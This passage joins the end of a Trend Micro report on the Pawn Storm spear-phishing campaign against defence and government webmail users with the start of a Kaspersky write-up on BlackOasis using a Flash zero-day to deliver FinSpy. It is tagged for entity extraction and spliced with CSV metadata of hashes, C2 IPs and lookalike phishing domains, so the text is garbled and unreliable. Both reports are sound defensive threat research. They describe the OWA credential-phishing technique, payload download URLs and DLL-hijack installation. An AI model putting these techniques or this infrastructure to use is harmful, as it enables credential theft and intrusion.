a keylogger, into 
<Windows>\
system32\

<IOC>Advstoreshell.dll</IOC> 
sends logs of stolen 
data to a C&C server 
(software-update.
org)

<IOC>Netui.dll</IOC> sends 
logs of stolen data 
to a C&C server 
(<IOC>200.74.244.118</IOC>)



<ORG>Trend Micro</ORG> | Operation <CAMPAIGN>Pawn Storm</CAMPAIGN>

11

Next-Level Phishing Targets

The attackers used specially crafted emails 
to redirect targets to any of several phishing 
websites with domain names that were very 
similar to those of well-known conferences 
and media outfits. These websites did not 
host malicious content but visiting them 
did lead to the automatic execution of a 
nonmalicious <SOFTWARE>JavaScript</SOFTWARE>. Links to these fake 
websites were then embedded in spear-
phishing emails and sent to selected targets.

Opening such an email and clicking the 
link in <SOFTWARE>OWA</SOFTWARE> redirected victims to legitimate 
websites. The <SOFTWARE>JavaScript</SOFTWARE> made it appear that 
the victims’ <SOFTWARE>OWA</SOFTWARE> sessions ended while at 
the same time, tricked them into reentering 
their credentials. To do this, the attackers 
redirected victims to fake <SOFTWARE>OWA</SOFTWARE> log-in pages 
by setting their browsers’ open windows 
property. The victims’ credentials thus ended 
up in the attackers’ hands.

Note that two special conditions need to 
be met for the attacks to succeed—victims 
should use <SOFTWARE>OWA</SOFTWARE> and click the embedded 
links via the web portal’s preview pane. The 
attacks worked on any popular browser such 
as <SOFTWARE>Firefox</SOFTWARE>®, <SOFTWARE>Safari</SOFTWARE>>®, <SOFTWARE>Chrome</SOFTWARE>™, and <SOFTWARE>Internet 
Explorer</SOFTWARE>®. No vulnerabilities need to be 
exploited for the <SOFTWARE>JavaScript</SOFTWARE> to work.

Because many companies allow employees 
to use webmail services to access their 
mailboxes while on business travel or at 
home, these attacks are likely to succeed. 
Once they do, attackers can gain access to 
compromised mailboxes that they can then 
use to gain a foothold in target networks.

Throughout the course of investigation, 
several targets have been identified, 
including:

• ACADEMI, formerly Blackwater 
(<COUNTRY>United States</COUNTRY>)

• Broadcasting companies in various 

countries

• Military attachés from various 
countries

• <ORG>Ministry of Defense</ORG> (<COUNTRY>France</COUNTRY>)

• <ORG>Ministry of Defense</ORG> (<COUNTRY>Hungary</COUNTRY>)

• Multinational company based in 
<COUNTRY>Germany</COUNTRY>

• <ORG>Organization for Security and Co-
operation in Europe</ORG> (<ORG>OSCE</ORG></OSCE>) (<COUNTRY>Austria</COUNTRY>)

• Pakistani military officials

• <ORG>Polish government</ORG> employees

• SAIC (<COUNTRY>United States</COUNTRY>)

• <ORG>U.S. Department of State</ORG>

• <ORG>Vatican Embassy</ORG> (<COUNTRY>Iraq</COUNTRY>)

The following case studies reveal more in-
depth details on four specific attacks.

CASE 1: <ORG>Ministry of Defense</ORG>, 
<COUNTRY>Hungary</COUNTRY>

• Malicious conference domain: 
<IOC>eurosatory2014.com</IOC>

• Real conference domain: 
eurosatory . com

• Phished <SOFTWARE>OWA</SOFTWARE> domain: <IOC>mail.hm.qov.hu</IOC>

• Real <SOFTWARE>OWA</SOFTWARE> domain: mail.hm.gov.hu

The attackers created a domain that was 
very similar to eurosatory . com [14], a website 
for an international land and air-land defense 
and security exhibition. They then sent emails 
with the link, <IOC>http://eurosatory2014.com</IOC>, to 
selected employees of the target defense 
ministry who might actually have been 
expecting to hear from the conference staff 



<ORG>Trend Micro</ORG> | Operation <CAMPAIGN>Pawn Storm</CAMPAIGN>

12

members.

Clicking the link embedded in the email 
via the <SOFTWARE>OWA</SOFTWARE> preview pane opens the real 
conference website in a new tab. The victims’ 
<SOFTWARE>OWA</SOFTWARE> session in the other tab, meanwhile, 
is redirected to a phished log-in page that 
makes it look like the session has ended.

 
Real “EUROSATORY 2014” conference website 

opens in a new tab after clicking the link in a 
spear-phishing email viewed in <SOFTWARE>OWA</SOFTWARE>

 
“Closed” <SOFTWARE>OWA</SOFTWARE> session page (fake) victims will 
see, forcing them to reenter their credentials

In reality, the victims’ <SOFTWARE>OWA</SOFTWARE> session did not 
end. The previously mentioned <SOFTWARE>JavaScript</SOFTWARE> 
just redirected them to a fake <SOFTWARE>OWA</SOFTWARE> log-
in page that looks just like the <ORG>Ministry of 
Defense</ORG> in <COUNTRY>Hungary</COUNTRY>’s real one.

Apart from “EUROSATORY 2014,” other 
conferences were also used to target 
employees of the <ORG>Ministry of Defense</ORG> in 
<COUNTRY>Hungary</COUNTRY> as shown in the following table.

Similar Attacks Against the <ORG>Ministry of Defense</ORG>, <COUNTRY>Hungary</COUNTRY>

Conference Target Domain Malicious Domain

“Africa Aerospace and Defence 
2014” <IOC>aadexpo.co.za</IOC> <IOC>aadexpo2014.co.za</IOC>

“The 10th Special Operations 
Forces Exhibition & Conference” <IOC>sofexjordan.com</IOC> <IOC>sofexjordan2014.com</IOC>

“ITEC” <IOC>itec.co.uk</IOC> <IOC>itec2014.co.uk</IOC>



<ORG>Trend Micro</ORG> | Operation <CAMPAIGN>Pawn Storm</CAMPAIGN>

13

CASE 2: <ORG>OSCE</ORG></OSCE>, <COUNTRY>Austria</COUNTRY>

• Malicious news domain: <IOC>vice-news.com</IOC>

• Real news domain: news.vice.com

• Phished <SOFTWARE>OWA</SOFTWARE> domain: <IOC>log-in-osce.org</IOC>

• Real <SOFTWARE>OWA</SOFTWARE> domain: log-in.osce.org

This attack targeted <ORG>OSCE</ORG></OSCE> employees in 
<COUNTRY>Austria</COUNTRY>. Although the attackers used similar 
tactics, they did not spoof a conference 
website. They instead used a fake version of 
the news website, news.vice.com.

 
Comparison of the legitimate (top) and spoofed 

(bottom) <SOFTWARE>OWA</SOFTWARE> log-in pages of <ORG>OSCE</ORG></OSCE>

Even though <ORG>OSCE</ORG></OSCE> provides better security 
for webmail users compared with the other 
targets via one-time session token use during 
log-in, attackers can still steal highly sensitive 
data from victims by hijacking a single 
session.

CASE 3: SAIC, <COUNTRY>United States</COUNTRY>

• Malicious conference domain: 
<IOC>natoexhibitionff14.com</IOC>

• Real conference domain: 
natoexhibition.org

• Phished <SOFTWARE>OWA</SOFTWARE> domain: <IOC>webmail-saic.com</IOC>

• Real <SOFTWARE>OWA</SOFTWARE> domain: webmail.saic.com

This attack targeting SAIC was very similar 
to the first case. The attackers spoofed 
the website of the “Future Forces 2014” 
conference to trick email recipients into 
handing over their webmail credentials.

 
Comparison of the legitimate (top) and spoofed 

(bottom) <SOFTWARE>OWA</SOFTWARE> log-in pages of SAIC

CASE 4: ACADEMI

• Malicious news domain: <IOC>tolonevvs.com</IOC>

• Real news domain: tolonews.com

• Phished <SOFTWARE>OWA</SOFTWARE> domain: academl.com

• Real <SOFTWARE>OWA</SOFTWARE> domain: academi.com



<ORG>Trend Micro</ORG> | Operation <CAMPAIGN>Pawn Storm</CAMPAIGN>

14

This attack targeted the employees of U.S. 
defense contractor, ACADEMI, using the 
same phishing tactics as in the second case.

 
Comparison of the legitimate (top) and spoofed 

(bottom) <SOFTWARE>OWA</SOFTWARE> log-in pages of ACADEMI

Apart from the four specific cases presented 
above, evidence pointing to a fake <SOFTWARE>OWA</SOFTWARE> 
server for a multinational company based in 
<COUNTRY>Germany</COUNTRY> was also discovered. The threat 
actors registered a domain that looked 
very similar to the target’s real domain and 
purchased a Secure Sockets Layer (SSL) 
certificate for the fake domain as part of 
preparations for a targeted attack. Trend 
Micro was able to warn the target early on, 
which helped thwart the threat.

Other Webmail Services

<SOFTWARE>OWA</SOFTWARE> users are not the only ones at risk 
though, as the threat actors behind Operation 
<CAMPAIGN>Pawn Storm</CAMPAIGN> also targeted users of free 
webmail services such as <SOFTWARE>Gmail</SOFTWARE>™, <SOFTWARE>Live Mail</SOFTWARE>, 
<ORG>Yahoo</ORG>!®, Hushmail, and <ORG>Yandex</ORG>.



<ORG>Trend Micro</ORG> | Operation <CAMPAIGN>Pawn Storm</CAMPAIGN>

15

 
Sample <SOFTWARE>Gmail</SOFTWARE>, <SOFTWARE>Live Mail</SOFTWARE>, Hushmail, and <ORG>Yandex</ORG> account phishing websites

We leaked specific credentials to the threat 
actors in a couple of cases to see if the 
fake webmail service log-in pages were 
indeed intended for attack use. Within 
minutes of leaking the test credentials, 
unauthorized log-ins were recorded. The 
first log-in was usually an automated log-
in check from the same IP address as the 
phishing website’s owner. The succeeding 
log-ins were made from the IP addresses, 

46.166.162.90 (<COUNTRY>Yahoo</COUNTRY>) and 192.154.110.244 
(<COUNTRY>United States</COUNTRY>), via Internet Message Access 
Protocol (IMAP). No other forms of abuse 
such as sending spam via the compromised 
accounts were witnessed. This showed that 
the attackers were indeed trying to obtain 
sensitive data from their targets instead 
of using their accounts for fraud and other 
financially motivated scams.



<ORG>Trend Micro</ORG> | Operation <CAMPAIGN>Pawn Storm</CAMPAIGN>

16

CONCLUSION

Operation <CAMPAIGN>Pawn Storm</CAMPAIGN> used next-level 
spear-phishing tactics to obtain the email 
credentials of primarily military, embassy, 
and defense contractor personnel from the 
<COUNTRY>United States</COUNTRY> and its allies. The threat actors 
used a mix of spear-phishing emails and 
specially crafted webmail service phishing 
websites to gain access to victims’ inboxes in 
hopes of getting better footholds inside target 
organizations. So as not to raise suspicion, 
the attackers used well-known events and 
conferences as social engineering bait. They 
have been quite persistent as well, as we 
have seen evidence that attacks have been 
going on since <TIMESTAMP>2007</TIMESTAMP>.

Apart from effective phishing tactics, the 
threat actors used a combination of proven 
targeted attack staples to compromise 
systems and get in to target networks—
exploits and data-stealing malware. <THREAT_ACTOR>SEDNIT</THREAT_ACTOR> 
variants particularly proved useful, as 
these allowed the threat actors to steal all 
manners of sensitive information from the 
victims’ computers while effectively evading 
detection.

<ORG>Trend Micro</ORG> has notified the targets that have 
been identified in this paper. Individuals and 
their respective organizations, meanwhile, 
should use solutions that can help protect 
against the various attack vectors that the 
threat actors behind Operation <CAMPAIGN>Pawn Storm</CAMPAIGN> 
used.

Messaging security solutions such as <ORG>Trend 
Micro</ORG>™ <SOFTWARE>InterScan</SOFTWARE>™ Messaging Security 
[15] and the <SOFTWARE>ScanMail</SOFTWARE>™ Suite for <SOFTWARE>Microsoft 
Exchange</SOFTWARE> [16] can send suspicious email 
attachments to a sandbox for analysis, thus 
protecting recipients from threats. Other 
products such as <SOFTWARE>OfficeScan</SOFTWARE>™ [17] for 
endpoints and <SOFTWARE>InterScan</SOFTWARE> Web Security Virtual 
Appliance [18] for gateways can also block 
user access to known phishing sites.

For overall protection against targeted 
attacks, <ORG>Trend Micro</ORG>™ Deep Discovery 
[19] can help protect potential targets by 
sandboxing and analyzing suspicious 
attachments to identify phishing emails via 
Email Inspector. Via 360-degree monitoring 
of network traffic to get networkwide 
visibility and intelligence, Deep Discovery 
allows users to detect and respond to 
targeted attacks and advanced threats. 
It also monitors all ports and more than 
80 protocols, giving users the broadest 
protection available. Even more, specialized 
detection engines and custom sandboxing 
help identify and analyze malware, C&C 
communications, and evasive attacker 
activities that are invisible to standard 
security solutions. Along with in-depth threat 
intelligence, it allows for rapid response 
and automatic sharing with other security 
products to create real-time custom defense 
against attacks.



<ORG>Trend Micro</ORG> | Operation <CAMPAIGN>Pawn Storm</CAMPAIGN>

17

REFERENCES

[1] <ORG>Trend Micro</ORG> Incorporated. (2014). 
Threat Encyclopedia. “<THREAT_ACTOR>SEDNIT</THREAT_ACTOR>.” Last 
accessed October 13, 2014, http:// about-threats.trendmicro.com/us/search. aspx?p=SEDNIT.

[2] Symantec Corporation. (1995‒2014). 
Symantec. “Infostealer.Sofacy.” Last 
accessed <TIMESTAMP>October 17, 2014</TIMESTAMP>, http:// www.symantec.com/security_response/ writeup.jsp?docid=2011-090714-2907-99&tabid=2.

[3] <ORG>Trend Micro</ORG> Incorporated. (2014). Threat 
Encyclopedia. “<MALWARE>BKDR_SEDNIT.AE.</MALWARE>” Last 
accessed October 13, 2014, http://about-
threats.trendmicro.com/us/malware/
BKDR_SEDNIT.AE.

[4] <ORG>Trend Micro</ORG> Incorporated. (2014). Threat 
Encyclopedia. “<MALWARE>BKDR_SEDNIT.SM.</MALWARE>” Last 
accessed <TIMESTAMP>October 13, 2014</TIMESTAMP>, http://about-
threats.trendmicro.com/us/malware/
BKDR_SEDNIT.SM.

[5] <ORG>Trend Micro</ORG> Incorporated. (2014). 
Threat Encyclopedia. “<MALWARE>TROJ_SEDNIT.
TOK.</MALWARE>” Last accessed <TIMESTAMP>October 13, 2014</TIMESTAMP>, 
http://about-threats.trendmicro.com/us/
malware/TROJ_SEDNIT.TOK.

[6] Wikimedia Foundation Inc. (March 16, 
2014). Wikipedia. “<CAMPAIGN>Pawn Storm</CAMPAIGN>.” Last 
accessed October 21, 2014, http://
en.wikipedia.org/wiki/Pawn_storm.

[7] The MITRE Corporation. (1999–2014). 
CVE. “<CVE>CVE-2010-3333</CVE>.” Last accessed 
<TIMESTAMP>October 16, 2014</TIMESTAMP>, http://cve.MITRE.org/cgi- bin/cvename.cgi?name=CVE-2010-3333.

[8] <ORG>Trend Micro</ORG> Incorporated. (2014). 
Threat Encyclopedia. “<MALWARE>TROJ_ARTIEF</MALWARE>.” 
Last accessed <TIMESTAMP>October 21, 2014</TIMESTAMP>, http://
www.trendmicro.com/vinfo/us/threat-
encyclopedia/malware/TROJ_ARTIEF.

[9] Post Staff. (January 9, 2012). New York 
Post. “Three Car Bombs Explode in <COUNTRY>Iraq</COUNTRY>, 
Killing 17.” Last accessed <TIMESTAMP>October 16, 
2014</TIMESTAMP>, http://nypost.com/2012/01/09/three-
car-bombs-explode-in-Iraq-killing-17/.

[10] The <ORG>MITRE</ORG> Corporation. (1999–
2014). CVE. “<CVE>CVE-2012-0158</CVE>.” Last 
accessed <TIMESTAMP>October 16, 2014</TIMESTAMP>, http://www.cve.MITRE.org/cgi-bin/cvename.cgi?name=CVE-2012-0158.

[11] IQPC. (2014). Homeland Security 
Summit Middle East. “Towards Total 
Preparedness: Advancing Command and 
Control and Communication for Increased 
Identification, Access, Surveillance, 
Cyber Protection Capabilities.” Last 
accessed <TIMESTAMP>October 16, 2014</TIMESTAMP>, http://www.
homelandsecurityme.com/.

[12] Malware@prevenity. (September 11, 
2014). “mht, MS12-27 oraz *malware*.
info.” Last accessed <TIMESTAMP>October 16, 2014</TIMESTAMP>, 
http://malware.prevenity.com/2014/08/
malware-info.html.

[13] R136a1. (December 27, 2012). 
Analyzing Unknown Malware. “#3 
Disclosure of Another 0-Day Malware—
Update and Additional Information.” 
Last accessed <TIMESTAMP>October 17, 2014</TIMESTAMP>, 
http://thegoldenmessenger.blogspot.
ro/2012/12/3-disclosure-of-another-0day-
malware_27.html.

[14] COGES. (2013). EUROSATORY 2014. 
“The Largest International Land and Air-
Land Defence and Security Exhibition.” 
Last accessed <TIMESTAMP>October 17, 2014</TIMESTAMP>, http://
www.eurosatory.com/.

[15] <ORG>Trend Micro</ORG> Incorporated. (2014). Trend 
Micro. “InterScan Messaging Security.” 
Last accessed <TIMESTAMP>October 21, 2014</TIMESTAMP>, http://
www.trendmicro.com/us/enterprise/
network-security/interscan-message-



<ORG>Trend Micro</ORG> | Operation <CAMPAIGN>Pawn Storm</CAMPAIGN>

18

security/.

[16] <ORG>Trend Micro</ORG> Incorporated. (2014). Trend 
Micro. “ScanMail Suite for Microsoft 
Exchange.” Last accessed <TIMESTAMP>October 21</TIMESTAMP>, 
2014, http://www.trendmicro.com/us/
enterprise/network-web-messaging-
security/scanmail-microsoft-exchange/.

[17] <ORG>Trend Micro</ORG> Incorporated. (2014). Trend 
Micro. “OfficeScan—Endpoint Protection.” 
Last accessed <TIMESTAMP>October 22, 2014</TIMESTAMP>, http://
www.trendmicro.com/us/enterprise/
product-security/officescan/.

[18] <ORG>Trend Micro</ORG> Incorporated. (2014). Trend 
Micro. “InterScan Web Security Virtual 
Appliance.” Last accessed <TIMESTAMP>October 22, 
2014</TIMESTAMP>, http://www.trendmicro.com/us/
enterprise/network-security/interscan-
web-security/virtual-appliance/.

[19] <ORG>Trend Micro</ORG> Incorporated. (2014). <ORG>Trend 
Micro</ORG>. “Deep Discovery Advanced 
Network Security.” Last accessed <TIMESTAMP>October 
21, 2014</TIMESTAMP>, http://www.trendmicro.com/
us/enterprise/security-risk-management/
deep-discovery/.



<ORG>Trend Micro</ORG> Incorporated, a global leader in security software, strives to make the 
world safe for exchanging digital information. Our innovative solutions for consumers, 
businesses and governments provide layered content security to protect information 
on mobile devices, endpoints, gateways, servers and the cloud. All of our solutions are 
powered by cloud-based global threat intelligence, the <ORG>Trend Micro</ORG>™ <SOFTWARE>Smart Protection 
Network</SOFTWARE>™, and are supported by over 1,200 threat experts around the globe. For more 
information, visit www.trendmicro.com.

©2014 by <ORG>Trend Micro</ORG>, Incorporated. All rights reserved. <ORG>Trend Micro</ORG> and the Trend 
Micro t-ball logo are trademarks or registered trademarks of <ORG>Trend Micro</ORG>, Incorporated. 
All other product or company names may be trademarks or registered trademarks of 
their owners.

225 E. John Carpenter Freeway, Suite 1500
<CITY>Irving</CITY>, Texas 75062 <COUNTRY>U.S.A.</COUNTRY>

Phone: +1.817.569,8900

http://www.trendmicro.com/us/index.html

	Introduction
	Ties That Bind the Operation Pawn

	Storm Attacks Together
	<THREAT_ACTOR>SEDNIT</THREAT_ACTOR>
	Attack Timeline
	Attack Details
	Attack Evolution
	Next-Level Phishing Targets
	Case 1: <ORG>Ministry of Defense</ORG>, <COUNTRY>Hungary</COUNTRY>
	Case 2: <ORG>OSCE</ORG></OSCE>, <COUNTRY>Austria</COUNTRY>
	Case 3: SAIC, <COUNTRY>United States</COUNTRY>
	Case 4: Academi

	Other Webmail Services

	Conclusion
	References",SEDNIT;Sofacy,"OWA;JavaScript;Gmail;Live Mail;InterScan;Microsoft™ Outlook® Web Access;Microsoft 
Word®;Microsoft 
Excel®;Excel;Firefox;Safari;Chrome;Internet 
Explorer;ScanMail;Microsoft 
Exchange;OfficeScan;Smart Protection 
Network",military;embassy,"Trend Micro;Ministry of Defense;OSCE;Vatican Embassy;Polish government;Yandex;Trend 
Micro;Russian government;Organization for Security and Co-
operation in Europe;U.S. Department of State;Ministry of 
Defense;Yahoo;MITRE","October 16, 2014;October 17, 2014;October 13, 2014;October 21, 2014;October 
17, 2011;January 
9, 2012;September 20, 
2013;January 23, 2014;August 11, 2014;2007;October 16, 
2014;October 21;October 22, 2014;October 22, 
2014;October 
21, 2014","TROJ_ARTIEF.AP;BKDR_SEDNIT.AE.;BKDR_SEDNIT.SM.;TROJ_SEDNIT.
TOK.;TROJ_ARTIEF",United States;Hungary;Austria;Iraq;France;Indonesia;Germany;U.S.;Yahoo;U.S.A.,"Netids.dll;APEC Media list 2013 Part1.xls;netids.dll;APEC Media list 2013 Part2.xls;MH17.doc;saver.scr;Cryptmodule.
exe;Coreshell.dll;Conhost.dll;International Military.rtf;IDF_Spokesperson_Terror_
Attack_011012.doc;Details.
doc;netidt.dll;coreshell.dll;dropper.exe;72cfd996957bde0 
6a02b0adb2d66d8a 
a9c25bf37;956d1a360 
55c903cb570890da 
69deabaacb5a18a;e8b55d9aeff124df4008b0d372bf2f2d3e5e5ae7;Dropper 
DLL;9c622b39521183dd71ed2a174031ca159beb6479;a90921c182cb90807102ef402719ee8060910345;b3098f99db1f80e27aec0c9a5a625aedaab5899a;78d28072fdabf0b5aac5e8f337dc768d07b63e1e;7FBB5A2E46FACD3EE0C945F324414210C2199FFB;DAE7FAA1725DB8192AD711D759B13F8195A18821;8D 
EF0A554F1913 
4A5DB3D2AE9 
49F9500CE3D 
D2CE;Letter to IAEA.
pdf;6ad 
a11c71a5176a8 
2a8898680ed1e 
aa4e79b9bc3;c5ce5b7d10a 
ccb04a4e45c3a 
4dcf10d16b192 
e2f;Military 
Cooperation.
doc;0E 
12C8AB9B89B6 
EB6BAF16C4B 
3BBF9530067 
963F;550AB 
D71650BAEA05 
A0071C4E084A 
803CB413C31;4B 
8806FE8E0CB4 
9E4AA5D8F877 
66415A2DB1E9 
A9;dd 
61530076152dae56 
8b4834b1899212c9 
6c1a02;APEC Media list 
2013 Part1.xls;ac6b 
465a13370f87cf579 
29b7cfd1e45c36945 
85;Spokesperson_
Targeted_
Attack_101012.
doc;F5 
42C5F9259274 
D94360013D14 
FFBECC43AAE 
552;Install.exe;BC58A 
8550C53689C8 
148B021C917F 
B4AEEC62AC;A85513 
97E1F1A2C014 
8E6EADCB56F 
A35EE6009CA;Tmp64.dat;200.106.145.122;6b87 
5661a74c46 
73ae6ee89a 
cc5cb6927ca 
5fd0d;88f7e27 
1e54c127912db4db 
49e37d93aea8a49c 
9;Dw20.t;3814eec 
8c45fc4313a9c7f65c 
e882a7899cf0405;14 
BEEB0FC5C8C887 
D0435009730B6370 
BF94BC93;B49FAD 
3E5E6787E96373A 
C37ED58083F7572 
D72A;70.85.221.20;S.vbs;0 
A3E6607D5E9 
C59C712106C3 
55962B11DA29 
02FC;Msmvs.exe;55318328511961EC 
339DFDDCA044306 
8DCCE9CD2;70.85.221.10,;70.85.221.10;advstoreshell.dll;E338A57C3 
5A4732BBB5F738E 
2387C1671A002BC 
B;netui.dll;5A452E7248A8D37 
45EF53CF2B1F3D7 
D8479546B9;Advstoreshell.dll;Netui.dll;200.74.244.118;eurosatory2014.com;mail.hm.qov.hu;http://eurosatory2014.com;aadexpo.co.za;aadexpo2014.co.za;sofexjordan.com;sofexjordan2014.com;itec.co.uk;itec2014.co.uk;vice-news.com;log-in-osce.org;natoexhibitionff14.com;webmail-saic.com;tolonevvs.com",Loucif Kharouni;Feike Hacquebord;Numaan Huq;Jim Gogolinski;Fernando Mercês;Alfred Remorin;Douglas Otis,"Pawn Storm;PAWN
STORM",,,,,,Irving,"CVE-2012-0158;CVE-2010-3333;CVE-2012-
0158",12,49,2,72,22,5,33,90,7,39,0,0,0,0,0,1,13
BlackOasis,"More information about <THREAT_ACTOR>BlackOasis</THREAT_ACTOR> <THREAT_ACTOR>APT</THREAT_ACTOR> is available to customers of

<ORG>Kaspersky</ORG> Intelligence Reporting Service. Contact:

intelreports@kaspersky.com

Introduction
<ORG>Kaspersky Lab</ORG> has always worked closely with vendors to protect users.

As soon as we find new vulnerabilities we immediately inform the vendor

in a responsible manner and provide all the details required for a fix.

On <TIMESTAMP>October 10, 2017</TIMESTAMP>, <ORG>Kaspersky Lab</ORG>’s advanced exploit prevention

systems identified a new <SOFTWARE>Adobe Flash</SOFTWARE> zero day exploit used in the wild

against our customers. The exploit was delivered through a <SOFTWARE>Microsoft Office</SOFTWARE> document and the final payload was the latest version of <MALWARE>FINSPY</MALWARE>

malware. We have reported the bug to <ORG>Adobe</ORG> who assigned it <CVE>CVE-2017-11292</CVE> and released a patch earlier today:

So far only one attack has been observed in our customer base, leading us

to believe the number of attacks are minimal and highly targeted.

Analysis of the payload allowed us to confidently link this attack to an

actor we track as “<THREAT_ACTOR>BlackOasis</THREAT_ACTOR>”. We are also highly confident that

<THREAT_ACTOR>BlackOasis</THREAT_ACTOR> was also responsible for another zero day exploit (<CVE>CVE-2017-8759</CVE>) discovered by <ORG>FIREEYE</ORG> in <TIMESTAMP>September 2017</TIMESTAMP>.  The FinSpy payload used

in the current attacks (<CVE>CVE-2017-11292</CVE>) shares the same command and

control (C2) server as the payload used with <CVE>CVE-2017-8759</CVE> uncovered

by <ORG>FIREEYE</ORG>.

new targeted attacks
leveraging zero-day
exploit
By <ORG>GReAT</ORG> on <TIMESTAMP>October 16, 2017. 2:28 pm</TIMESTAMP>

mailto:intelreports@kaspersky.com
https://helpx.adobe.com/security/products/flash-player/apsb17-32.html
https://cdn.securelist.com/files/2017/10/cve_2017_11292_credits.png
https://www.fireeye.com/blog/threat-research/2017/09/zero-day-used-to-distribute-finspy.html
https://securelist.com/author/great/


<THREAT_ACTOR>BlackOasis</THREAT_ACTOR> Background
We first became aware of <THREAT_ACTOR>BlackOasis</THREAT_ACTOR>’ activities in <TIMESTAMP>May 2016</TIMESTAMP>, while

investigating another <SOFTWARE>Adobe Flash</SOFTWARE> zero day. On <TIMESTAMP>May 10, 2016</TIMESTAMP>, <ORG>Adobe</ORG>

warned of a vulnerability (<CVE>CVE-2016-4117</CVE>) affecting <SOFTWARE>Flash Player 21.0.0.226</SOFTWARE> and earlier versions for <SOFTWARE>Windows</SOFTWARE>, <SOFTWARE>Macintosh</SOFTWARE>, <SOFTWARE>Linux</SOFTWARE>, and

<SOFTWARE>Chrome OS</SOFTWARE>. The vulnerability was actively being exploited in the wild.

<ORG>Kaspersky Lab</ORG> was able to identify a sample exploiting this vulnerability

that was uploaded to a multi scanner system on <TIMESTAMP>May 8, 2016</TIMESTAMP>. The sample,

in the form of an RTF document, exploited <CVE>CVE-2016-4117</CVE> to download

and install a program from a remote C&C server. Although the exact

payload of the attack was no longer in the C&C, the same server was

hosting multiple <MALWARE>FINSPY</MALWARE> installation packages.

Leveraging data from <SOFTWARE>Kaspersky Security Network</SOFTWARE>, we identified two

other similar exploit chains used by <THREAT_ACTOR>BlackOasis</THREAT_ACTOR> in <TIMESTAMP>June 2015</TIMESTAMP> which were

zero days at the time.  Those include <CVE>CVE-2015-5119</CVE> and <CVE>CVE-2016-0984</CVE>, which were patched in <TIMESTAMP>July 2015</TIMESTAMP> and <TIMESTAMP>February 2016</TIMESTAMP> respectively. 

These exploit chains also delivered <MALWARE>FINSPY</MALWARE> installation packages.

Since the discovery of <THREAT_ACTOR>BlackOasis</THREAT_ACTOR>’ exploitation network, we’ve been

tracking this threat actor with the purpose of better understanding their

operations and targeting and have seen a couple dozen new attacks.

Some lure documents used in these attacks are shown below:

https://helpx.adobe.com/security/products/flash-player/apsa16-02.html
https://cdn.securelist.com/files/2017/10/171016-blackoasis-1.png


Decoy documents used in <THREAT_ACTOR>BlackOasis</THREAT_ACTOR> attacks

To summarize, we have seen <THREAT_ACTOR>BlackOasis</THREAT_ACTOR> utilizing at least five zero days

<TIMESTAMP>since June 2015</TIMESTAMP>:

<CVE>CVE-2015-5119</CVE> – <TIMESTAMP>June 2015</TIMESTAMP>

<CVE>CVE-2016-0984</CVE> – <TIMESTAMP>June 2015</TIMESTAMP>

<CVE>CVE-2016-4117</CVE> – <TIMESTAMP>May 2016</TIMESTAMP>

<CVE>CVE-2017-8759</CVE> – <TIMESTAMP>Sept 2017</TIMESTAMP>

<CVE>CVE-2017-11292</CVE> – <TIMESTAMP>Oct 2017</TIMESTAMP>

Attacks Leveraging <CVE>CVE-2017-11292</CVE>
The attack begins with the delivery of an <SOFTWARE>Office</SOFTWARE> document, presumably in

this instance via e-mail.  Embedded within the document is an <SOFTWARE>ActiveX</SOFTWARE>

object which contains the <SOFTWARE>Flash</SOFTWARE> exploit.

https://cdn.securelist.com/files/2017/10/171016-blackoasis-2.png


<SOFTWARE>Flash</SOFTWARE> object in the .docx file, stored in uncompressed format

The <SOFTWARE>Flash</SOFTWARE> object contains an ActionScript which is responsible for

extracting the exploit using a custom packer seen in other <MALWARE>FINSPY</MALWARE> exploits.

Unpacking routine for SWF exploit

https://cdn.securelist.com/files/2017/10/171016-blackoasis-3.png
https://cdn.securelist.com/files/2017/10/171016-blackoasis-4.png
https://cdn.securelist.com/files/2017/10/171016-blackoasis-5.png


The exploit is a memory corruption vulnerability that exists in the

“com.adobe.tvsdk.mediacore.BufferControlParameters” class.  If the

exploit is successful, it will gain arbitrary read / write operations within

memory, thus allowing it to execute a second stage shellcode.

The first stage shellcode contains an interesting NOP sled with alternative

instructions, which was most likely designed in such a way to avoid

detection by antivirus products looking for large NOP blocks inside <SOFTWARE>flash</SOFTWARE>

files:

NOP sled composed of 0x90 and 0x91 opcodes

The main purpose of the initial shellcode is to download second stage

shellcode from <IOC>hxxp://89.45.67[.]107/rss/5uzosoff0u.iaf</IOC>.

https://cdn.securelist.com/files/2017/10/171016-blackoasis-6.png
https://cdn.securelist.com/files/2017/10/171016-blackoasis-7.png


Second stage shellcode

The second stage shellcode will then perform the following actions:

1. Download the final payload (<MALWARE>FINSPY</MALWARE>) from

<IOC>hxxp://89.45.67[.]107/rss/mo.exe</IOC>

2. Download a lure document to display to the victim from the same IP

3. Execute the payload and display the lure document

Payload – mo.exe

As mentioned earlier, the “<IOC>mo.exe</IOC>” payload (MD5:

<IOC>4a49135d2ecc07085a8b7c5925a36c0a</IOC>) is the newest version of <THREAT_ACTOR>Gamma International</THREAT_ACTOR>’s <MALWARE>FinSpy</MALWARE> malware, typically sold to nation states and other

law enforcement agencies to use in lawful surveillance operations.  This

newer variant has made it especially difficult for researchers to analyze

the malware due to many added anti-analysis techniques, to include a

custom packer and virtual machine to execute code.

The PCODE of the virtual machine is packed with the aplib packer.

Part of packed VM PCODE

After unpacking, the PCODE it will look like the following:

https://cdn.securelist.com/files/2017/10/171016-blackoasis-8.png


Unpacked PCODE

After unpacking the virtual machine PCODE is then decrypted:

Decrypted VM PCODE

The custom virtual machine supports a total of 34 instructions:

Example of parsed PCODE

In this example, the “1b” instruction is responsible for executing native

code that is specified in parameter field.

Once the payload is successfully executed, it will proceed to copy files to

the following locations:

https://cdn.securelist.com/files/2017/10/171016-blackoasis-9.png
https://cdn.securelist.com/files/2017/10/171016-blackoasis-10.png
https://cdn.securelist.com/files/2017/10/171016-blackoasis-11.png


C:\ProgramData\ManagerApp\AdapterTroubleshooter.exe

C:\ProgramData\ManagerApp\15b937.cab

C:\ProgramData\ManagerApp\install.cab

C:\ProgramData\ManagerApp\msvcr90.dll

C:\ProgramData\ManagerApp\d3d9.dll

The “AdapterTroubleshooter.exe” file is a legitimate binary which is

leveraged to use the famous DLL search order hijacking technique.  The

“<IOC>d3d9.dll</IOC>” file is malicious and is loaded into memory by the legit binary

upon execution.  Once loaded, the DLL will then inject <MALWARE>FINSPY</MALWARE> into the

Winlogon process.

Part of injected code in winlogon process

The payload calls out to three C2 servers for further control and

exfiltration of data. We have observed two of them used in the past with

other <MALWARE>FINSPY</MALWARE> payloads. Most recently one of these C2 servers was used

